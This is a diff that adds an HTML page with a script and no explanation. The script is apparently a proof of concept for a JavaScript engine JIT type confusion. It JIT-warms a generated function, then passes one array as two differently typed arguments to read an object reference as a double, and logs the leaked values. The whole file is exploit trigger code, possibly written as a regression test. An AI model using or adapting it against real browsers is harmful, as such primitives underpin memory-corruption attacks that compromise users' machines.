@@ -1,0 +1,33 @@
+<!doctype html>
+<meta charset="utf-8">
+<script>
+const lines = ["function trigger(x, arr, alias, obj, idx, limit) {"];
+for (let i = 0; i < 650; i++) lines.push(`if (x === ${i}) return ${i};`);
+lines.push("let pre = alias[0] + 0.0;");
+lines.push("arr[0] = obj;");
+lines.push("let i = 0, res = pre;");
+lines.push("while (i < limit) {");
+for (let i = 0; i < 430; i++) lines.push(`res = (res + ${i % 7}) | 0;`);
+lines.push("res = alias[idx] + 0.0;");
+lines.push("alias.push(4.950618252845e-311);");
+lines.push("i++;");
+lines.push("}");
+lines.push("return res;");
+lines.push("}");
+lines.push("return trigger;");
+const trigger = new Function(lines.join("\n"))();
+const obj = { marker: 0x1337 };
+function smi() { return [1, 2, 3]; }
+function holeyDouble() { const a = new Array(3); a.fill(1.1); return a; }
+for (let i = 0; i < 20000; i++) trigger(1000, smi(), holeyDouble(), obj, 0, 1);
+console.log("warmup complete");
+setTimeout(() => {
+  const victim = smi();
+  try {
+    const result = trigger(1000, victim, victim, obj, 0, 1);
+    console.log("result", typeof result, result);
+    for (let i = 0; i < 7; i++) console.log("victim" + i, typeof victim[i], victim[i]);
+    console.log("length", victim.length);
+  } catch (e) { console.log("caught", e && e.name, String(e)); }
+}, 1000);
+</script>
